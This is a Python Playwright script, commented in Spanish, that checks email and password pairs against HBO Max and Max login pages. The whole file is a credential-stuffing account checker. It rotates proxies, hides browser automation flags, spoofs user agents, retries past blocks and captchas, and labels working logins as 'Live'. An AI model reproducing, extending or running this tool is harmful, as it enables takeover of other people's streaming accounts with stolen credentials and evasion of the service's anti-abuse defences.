import asyncio
import random
import os
from playwright.async_api import async_playwright

PROXIES_FILE = "proxies.txt"

def get_random_proxy():
    """Lee un proxy aleatorio del archivo proxies.txt"""
    if not os.path.exists(PROXIES_FILE):
        return None
    with open(PROXIES_FILE, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
    if not proxies:
        return None
    
    proxy_str = random.choice(proxies)
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return {"server": f"http://{parts[0]}:{parts[1]}"}
    elif len(parts) == 4:
        return {
            "server": f"http://{parts[0]}:{parts[1]}",
            "username": parts[2],
            "password": parts[3]
        }
    return None

async def check_hbo_account_browser(email, password, max_retries=3):
    """
    Verifica una cuenta de HBO Max/Max usando Playwright con la URL real y evasión pro.
    """
    # Lista de URLs de login reales
    login_urls = [
        "https://auth.hbomax.com/login",
        "https://auth.max.com/login",
        "https://www.max.com/login"
    ]
    
    last_error = ""
    
    for attempt in range(max_retries):
        proxy = get_random_proxy()
        url = random.choice(login_urls)
        
        async with async_playwright() as p:
            try:
                browser = await p.chromium.launch(
                    headless=True,
                    proxy=proxy if proxy else None,
                    args=[
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-web-security",
                        "--disable-features=IsolateOrigins,site-per-process",
                        f"--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(115, 120)}.0.0.0 Safari/537.36"
                    ]
                )
                
                context = await browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    ignore_https_errors=True
                )
                
                # Ocultar rastro de automatización
                await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                
                page = await context.new_page()
                
                # Navegación con timeout extendido y espera inteligente
                try:
                    await page.goto(url, wait_until="load", timeout=60000)
                except Exception as e:
                    if "ERR_EMPTY_RESPONSE" in str(e) or "CONNECTION_RESET" in str(e):
                        await browser.close()
                        last_error = f"Proxy Blocked ({str(e)})"
                        continue
                    raise e

                # Esperamos que aparezca el formulario
                # Buscamos por varios selectores posibles
                try:
                    await page.wait_for_selector('input[type="email"], input[name="email"], input[id="email"]', timeout=20000)
                except:
                    # Si no aparece, puede que el proxy sea lento o esté bloqueado por un captcha invisible
                    content = await page.content()
                    if "denied" in content.lower() or "blocked" in content.lower():
                        await browser.close()
                        last_error = "Access Denied / Captcha"
                        continue
                    raise Exception("Login form not loaded")

                # Rellenamos email
                await page.fill('input[type="email"], input[name="email"]', email)
                await asyncio.sleep(random.uniform(1, 2))
                await page.keyboard.press("Enter")
                
                # Esperamos al password
                try:
                    password_input = await page.wait_for_selector('input[type="password"], input[name="password"]', timeout=15000)
                    await password_input.fill(password)
                    await asyncio.sleep(random.uniform(1, 2))
                    await page.keyboard.press("Enter")
                except:
                    # A veces hay una pantalla intermedia
                    await page.keyboard.press("Enter")
                    password_input = await page.wait_for_selector('input[type="password"]', timeout=10000)
                    await password_input.fill(password)
                    await page.keyboard.press("Enter")

                # Verificamos éxito
                # Esperamos redirección o mensaje de error
                await asyncio.sleep(10)
                
                final_url = page.url
                content = await page.content()
                content_lower = content.lower()
                
                await browser.close()
                
                # Criterios de éxito
                if any(x in final_url for x in ["browse", "profiles", "select-user"]):
                    return True, "Live (Login Success)"
                
                if any(x in content_lower for x in ["incorrect", "inválid", "reintenta", "wrong"]):
                    return False, "Invalid Credentials"
                
                if "login" not in final_url and "auth" not in final_url:
                    return True, "Live (Redirected Success)"
                
                last_error = "Unknown Result (Stuck on Login)"
                
            except Exception as e:
                last_error = str(e)
                continue
                
    return False, f"All attempts failed. Last error: {last_error}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) == 3:
        res, msg = asyncio.run(check_hbo_account_browser(sys.argv[1], sys.argv[2]))
        print(f"Result: {res} | Msg: {msg}")
